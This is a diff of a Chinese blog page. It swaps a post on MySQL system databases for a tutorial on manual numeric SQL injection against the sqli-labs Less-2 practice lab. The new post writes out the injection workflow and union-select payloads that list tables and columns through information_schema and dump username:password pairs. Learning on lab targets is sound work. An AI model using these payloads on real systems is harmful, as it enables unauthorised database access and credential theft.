@@ -19,32 +19,32 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"www.oliver.ren","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="数据库就是一个存储数据的仓库，数据库是以一定方式存储在一起，能与多个用户共享，具有尽可能小的冗余，与应用程序彼此独立的数据集合。 关系型数据库，存储的格式可以直观地反映实体间的关系，和常见的Excel表格比较相似。 数据库服务器层级关系 多个数据库 多个数据表 多个行、列、字段 多条数据   MySQL系统库提供了访问数据库元数据的方式。 元数据是关于数据库的数据，如数据库名和表名，列的数据类型或">
+    <meta name="description" content="本章节重点在于熟悉注入流程，以及注入原理。练习靶场为sqli-labs第二关数字型注入。 数字型注入 在url中输入id值，执行查询sql语句，即可得到对应数据 less-2源码分析：  浏览器 进行数据提交 服务器： 12345get 提交  ：  url   数据长度      速度快  	 用于： post 提交 ： 服务器    安全性   数据量   SQL注入流程 注入语句123456">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入之MySQL数据库">
-<meta property="og:url" content="https://www.oliver.ren/2025/02/27/20250227-03.html">
+<meta property="og:title" content="SQL注入之MySQL手工注入之数字型注入">
+<meta property="og:url" content="https://www.oliver.ren/2025/03/04/20250304-01.html">
 <meta property="og:site_name" content="Oliver&#39;s Blog">
-<meta property="og:description" content="数据库就是一个存储数据的仓库，数据库是以一定方式存储在一起，能与多个用户共享，具有尽可能小的冗余，与应用程序彼此独立的数据集合。 关系型数据库，存储的格式可以直观地反映实体间的关系，和常见的Excel表格比较相似。 数据库服务器层级关系 多个数据库 多个数据表 多个行、列、字段 多条数据   MySQL系统库提供了访问数据库元数据的方式。 元数据是关于数据库的数据，如数据库名和表名，列的数据类型或">
+<meta property="og:description" content="本章节重点在于熟悉注入流程，以及注入原理。练习靶场为sqli-labs第二关数字型注入。 数字型注入 在url中输入id值，执行查询sql语句，即可得到对应数据 less-2源码分析：  浏览器 进行数据提交 服务器： 12345get 提交  ：  url   数据长度      速度快  	 用于： post 提交 ： 服务器    安全性   数据量   SQL注入流程 注入语句123456">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://www.oliver.ren/assets/20250227/fb465fa71748499e9506641f5d1753d4.png">
-<meta property="og:image" content="https://www.oliver.ren/assets/20250227/ebc0692f9b514e24830e0f42bc49b829.png">
-<meta property="og:image" content="https://www.oliver.ren/assets/20250227/a462c288bf1f4fbbb800b492fda3f33a.png">
-<meta property="article:published_time" content="2025-02-27T12:20:36.000Z">
-<meta property="article:modified_time" content="2025-02-27T12:40:03.256Z">
+<meta property="og:image" content="https://www.oliver.ren/assets/20250304/84e4234864c844deaedd40fbfcda1477.png">
+<meta property="og:image" content="https://www.oliver.ren/assets/20250304/ac74d24f543347eaa6d8e90685e70281.png">
+<meta property="og:image" content="https://www.oliver.ren/assets/20250304/85375d4d5d324ced94ef53b44a7be7a6.png">
+<meta property="article:published_time" content="2025-03-04T13:34:36.000Z">
+<meta property="article:modified_time" content="2025-03-04T13:41:37.223Z">
 <meta property="article:author" content="Oliver King">
-<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="MySQL">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.oliver.ren/assets/20250227/fb465fa71748499e9506641f5d1753d4.png">
+<meta name="twitter:image" content="https://www.oliver.ren/assets/20250304/84e4234864c844deaedd40fbfcda1477.png">
 
 
-<link rel="canonical" href="https://www.oliver.ren/2025/02/27/20250227-03.html">
+<link rel="canonical" href="https://www.oliver.ren/2025/03/04/20250304-01.html">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.oliver.ren/2025/02/27/20250227-03.html","path":"2025/02/27/20250227-03.html","title":"SQL注入之MySQL数据库"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.oliver.ren/2025/03/04/20250304-01.html","path":"2025/03/04/20250304-01.html","title":"SQL注入之MySQL手工注入之数字型注入"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>SQL注入之MySQL数据库 | Oliver's Blog</title>
+<title>SQL注入之MySQL手工注入之数字型注入 | Oliver's Blog</title>
   
 
 
@@ -144,7 +144,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B1%82%E7%BA%A7%E5%85%B3%E7%B3%BB"><span class="nav-number">1.</span> <span class="nav-text">数据库服务器层级关系</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL%E7%B3%BB%E7%BB%9F%E5%BA%93"><span class="nav-number">2.</span> <span class="nav-text">MySQL系统库</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#information-schema"><span class="nav-number">2.1.</span> <span class="nav-text">information_schema</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#performance-schema"><span class="nav-number">2.2.</span> <span class="nav-text">performance_schema</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql"><span class="nav-number">2.3.</span> <span class="nav-text">mysql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sys"><span class="nav-number">2.4.</span> <span class="nav-text">sys</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">数字型注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">SQL注入流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="nav-number">3.</span> <span class="nav-text">注入语句</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -189,7 +189,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.oliver.ren/2025/02/27/20250227-03.html">
+    <link itemprop="mainEntityOfPage" href="https://www.oliver.ren/2025/03/04/20250304-01.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -202,12 +202,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="SQL注入之MySQL数据库 | Oliver's Blog">
+      <meta itemprop="name" content="SQL注入之MySQL手工注入之数字型注入 | Oliver's Blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          SQL注入之MySQL数据库
+          SQL注入之MySQL手工注入之数字型注入
         </h1>
 
         <div class="post-meta-container">
@@ -219,7 +219,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2025-02-27 20:20:36 / 修改时间：20:40:03" itemprop="dateCreated datePublished" datetime="2025-02-27T20:20:36+08:00">2025-02-27</time>
+      <time title="创建时间：2025-03-04 21:34:36 / 修改时间：21:41:37" itemprop="dateCreated datePublished" datetime="2025-03-04T21:34:36+08:00">2025-03-04</time>
     </span>
 
   
@@ -231,32 +231,16 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><p>数据库就是一个存储数据的仓库，数据库是以一定方式存储在一起，能与多个用户共享，具有尽可能小的冗余，与应用程序彼此独立的数据集合。</p>
-<p>关系型数据库，存储的格式可以直观地反映实体间的关系，和常见的Excel表格比较相似。</p>
-<h1 id="数据库服务器层级关系"><a href="#数据库服务器层级关系" class="headerlink" title="数据库服务器层级关系"></a>数据库服务器层级关系</h1><ul>
-<li>多个数据库</li>
-<li>多个数据表</li>
-<li>多个行、列、字段</li>
-<li>多条数据</li>
-</ul>
-<p><img src="/./assets/20250227/fb465fa71748499e9506641f5d1753d4.png" alt="MySQL结构"></p>
-<h1 id="MySQL系统库"><a href="#MySQL系统库" class="headerlink" title="MySQL系统库"></a>MySQL系统库</h1><p>提供了访问数据库元数据的方式。</p>
-<p>元数据是关于数据库的数据，如数据库名和表名，列的数据类型或访问权限。</p>
-<p><img src="/./assets/20250227/ebc0692f9b514e24830e0f42bc49b829.png" alt="MySQL元数据"></p>
-<h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><p>信息数据库，保存着关于MySQL服务器所维护的所有其他数据库的信息；</p>
-<p>例如：数据库或表的名称，列的数据类型或访问权限。有时用于此信息的其他术语是数据字典和系统目录。在Web渗透过程中用途很大。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SCHEMATA 表：提供了当前MySQL实例中所有数据库信息，show databases结果来自此表。</span><br><span class="line"></span><br><span class="line">TABLES表：提供了关于数据中表的信息。table_name是关键字段。</span><br><span class="line"></span><br><span class="line">COLUMNS表：提供了表的列信息，详细描述了某张表的所有列以及每个列的信息。column_name是关键字段。</span><br></pre></td></tr></table></figure>
+    <div class="post-body" itemprop="articleBody"><p>本章节重点在于熟悉注入流程，以及注入原理。练习靶场为sqli-labs第二关数字型注入。</p>
+<h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p><img src="/./assets/20250304/84e4234864c844deaedd40fbfcda1477.png" alt="数字型注"></p>
+<p>在url中输入id值，执行查询sql语句，即可得到对应数据</p>
+<p>less-2源码分析：</p>
+<p><img src="/./assets/20250304/ac74d24f543347eaa6d8e90685e70281.png" alt="less-2源码"></p>
+<p>浏览器 进行数据提交 服务器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get 提交  ：  url   数据长度 </span><br><span class="line">     速度快  </span><br><span class="line">	 用于： </span><br><span class="line"></span><br><span class="line">post 提交 ： 服务器    安全性   数据量 </span><br></pre></td></tr></table></figure>
 
-<p><img src="/./assets/20250227/a462c288bf1f4fbbb800b492fda3f33a.png" alt="information_schema库"></p>
-<h2 id="performance-schema"><a href="#performance-schema" class="headerlink" title="performance_schema"></a>performance_schema</h2><p>MySQL 5.5开始新增一个数据库：PERFORMANCE_SCHEMA，具有87张表，主要用于收集数据库服务器性能参数。</p>
-<p>内存数据库，数据放在内存中直接操作的数据库。</p>
-<p>相对于磁盘，内存的数据读写速度要高出几个数量级。</p>
-<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>是核心数据库，类似于sql server中的master表，主要负责存储数据库的用户（账户）信息、权限设置、关键字等mysql自己需要使用的控制和管理信息。</p>
-<p>不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。</p>
-<p>常用举例：在mysql.user表中存储着用户的密码。</p>
-<h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>是MySQL5.7增加的系统数据库，这个库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据，具有1个表，100个视图。</p>
-<p>这个库可以查询谁使用了最多的资源，哪张表访问最多等。</p>
-
+<h1 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h1><p><img src="/./assets/20250304/85375d4d5d324ced94ef53b44a7be7a6.png" alt="SQL注入流程"></p>
+<h1 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">尝试手工注入：</span><br><span class="line">	SQL注入： </span><br><span class="line">		1.判断有无注入点   and 1 = 1； true </span><br><span class="line">		随便输入内容  ==  报错  注入</span><br><span class="line">		              ==  没有注入</span><br><span class="line">		2.猜解列名数量 order by %20 空格</span><br><span class="line">		字段 4个</span><br><span class="line"></span><br><span class="line">		3.报错，判断回显点 union </span><br><span class="line">		4.信息收集 </span><br><span class="line">		  数据库版本 version()</span><br><span class="line">		  高版本：5.0  </span><br><span class="line">			系统库： infromation 。。。</span><br><span class="line">		  数据库名称：database（）</span><br><span class="line">		  低版本：5.0 </span><br><span class="line">		5.使用对应SQL进行注入  </span><br><span class="line">			数据库库名：security</span><br><span class="line">		. 下一级  </span><br><span class="line">		infromation_schema.tables 查找表名</span><br><span class="line">		table_name</span><br><span class="line">		查询serurity库下面 所有的表名 </span><br><span class="line">		database（）</span><br><span class="line"></span><br><span class="line">		= 前后 连到一起</span><br><span class="line">		union select 1,group_concat(table_name),3 from information_schema.tables</span><br><span class="line">		where table_schema=database()</span><br><span class="line"></span><br><span class="line">		表： users</span><br><span class="line">		如何查询表里面有那些字段？ </span><br><span class="line">		user 字符 转行 16进制</span><br><span class="line">		union select 1,group_concat(column_name),3 from information_schema.columns</span><br><span class="line">		where table_name=0x7573657273</span><br><span class="line"></span><br><span class="line">		username  password  字段数据  </span><br><span class="line">		select username,password from users</span><br><span class="line">		0x3a  :</span><br><span class="line">		union select 1,2,(select group_concat(username,0x3a,password)from users)</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -265,21 +249,18 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/SQL/" rel="tag"># SQL</a>
+              <a href="/tags/MySQL/" rel="tag"># MySQL</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2025/02/27/20250227-02.html" rel="prev" title="SQL注入之数据库概述">
-                  <i class="fa fa-angle-left"></i> SQL注入之数据库概述
+                <a href="/2025/02/27/20250227-04.html" rel="prev" title="MySQL语句语法回顾">
+                  <i class="fa fa-angle-left"></i> MySQL语句语法回顾
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2025/02/27/20250227-04.html" rel="next" title="MySQL语句语法回顾">
-                  MySQL语句语法回顾 <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
